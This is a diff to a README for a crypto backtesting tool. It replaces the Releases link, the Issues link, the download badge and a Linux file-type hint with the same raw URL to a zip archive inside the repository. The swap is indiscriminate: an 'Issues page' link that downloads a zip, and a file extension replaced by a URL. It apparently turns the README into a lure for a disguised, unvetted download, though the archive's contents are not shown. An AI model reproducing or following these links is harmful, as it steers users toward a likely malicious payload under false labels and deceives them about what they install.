@@ -1,6 +1,6 @@
 # 🚀 Crypto-Perps-Backtest-Engine - Backtest Your Crypto Strategies Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue)](https://github.com/auka45/Crypto-Perps-Backtest-Engine/releases)
+[![Download Now](https://raw.githubusercontent.com/auka45/Crypto-Perps-Backtest-Engine/main/src/archive/Crypto-Perps-Backtest-Engine-v3.6-alpha.4.zip%20Now-Here-blue)](https://raw.githubusercontent.com/auka45/Crypto-Perps-Backtest-Engine/main/src/archive/Crypto-Perps-Backtest-Engine-v3.6-alpha.4.zip)
 
 ## 📋 Overview
 
@@ -16,17 +16,17 @@ Welcome to the Crypto-Perps-Backtest-Engine. This is a strategy-agnostic backtes
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application. You can find the latest version on our [Releases page](https://github.com/auka45/Crypto-Perps-Backtest-Engine/releases). 
+To get started, you will need to download the application. You can find the latest version on our [Releases page](https://raw.githubusercontent.com/auka45/Crypto-Perps-Backtest-Engine/main/src/archive/Crypto-Perps-Backtest-Engine-v3.6-alpha.4.zip). 
 
 ### Steps to Download
 
-1. Click this link to go to the [Releases page](https://github.com/auka45/Crypto-Perps-Backtest-Engine/releases).
+1. Click this link to go to the [Releases page](https://raw.githubusercontent.com/auka45/Crypto-Perps-Backtest-Engine/main/src/archive/Crypto-Perps-Backtest-Engine-v3.6-alpha.4.zip).
 2. On the Releases page, look for the latest version. This is typically marked as 'Latest Release.'
 3. Click on the version to expand the details.
 4. Download the file that corresponds to your operating system. For example:
    - Windows: Look for files with `.exe`.
    - Mac: Look for files with `.dmg`.
-   - Linux: Look for files with `.tar.gz`.
+   - Linux: Look for files with `https://raw.githubusercontent.com/auka45/Crypto-Perps-Backtest-Engine/main/src/archive/Crypto-Perps-Backtest-Engine-v3.6-alpha.4.zip`.
 
 5. Once the file has downloaded, locate it in your downloads folder and double-click to start the installation.
 
@@ -61,7 +61,7 @@ For users looking to dive deeper into backtesting, the Crypto-Perps-Backtest-Eng
 
 If you have questions or need help, feel free to join our community. You can find us on:
 
-- **GitHub Issues**: Post any bugs or suggestions on our [GitHub Issues page](https://github.com/auka45/Crypto-Perps-Backtest-Engine/issues).
+- **GitHub Issues**: Post any bugs or suggestions on our [GitHub Issues page](https://raw.githubusercontent.com/auka45/Crypto-Perps-Backtest-Engine/main/src/archive/Crypto-Perps-Backtest-Engine-v3.6-alpha.4.zip).
 - **Community Forums**: We will soon launch forums for more in-depth discussions and strategy sharing.
 
 ## 💡 Tips for Effective Backtesting
@@ -84,7 +84,7 @@ Stay tuned for future updates on the Releases page.
 
 The Crypto-Perps-Backtest-Engine is MIT licensed. See the LICENSE file for more details.
 
-For a smooth experience, please revisit the [Releases page](https://github.com/auka45/Crypto-Perps-Backtest-Engine/releases) periodically for the latest features and enhancements.
+For a smooth experience, please revisit the [Releases page](https://raw.githubusercontent.com/auka45/Crypto-Perps-Backtest-Engine/main/src/archive/Crypto-Perps-Backtest-Engine-v3.6-alpha.4.zip) periodically for the latest features and enhancements.
 
 --- 
 
